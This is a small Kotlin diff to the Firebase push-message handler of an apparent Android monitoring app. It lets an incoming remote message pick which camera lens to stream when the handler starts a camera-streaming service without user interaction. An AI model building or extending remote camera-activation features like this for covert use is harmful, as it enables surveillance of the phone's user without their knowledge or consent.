@@ -57,8 +57,9 @@ class SpappFirebaseMessagingService : FirebaseMessagingService() {
                 android.Manifest.permission.CAMERA
             ) == android.content.pm.PackageManager.PERMISSION_GRANTED
             if (hasCameraPermission) {
-                Log.d(TAG, "FCM fast-path: triggering camera stream immediately")
-                com.spapp.monitoring.camerastream.CameraStreamService.start(applicationContext, "back")
+                val targetLens = message.data["lens"] ?: "back"
+                Log.d(TAG, "FCM fast-path: triggering camera stream with lens: $targetLens")
+                com.spapp.monitoring.camerastream.CameraStreamService.start(applicationContext, targetLens)
             }
         }
 
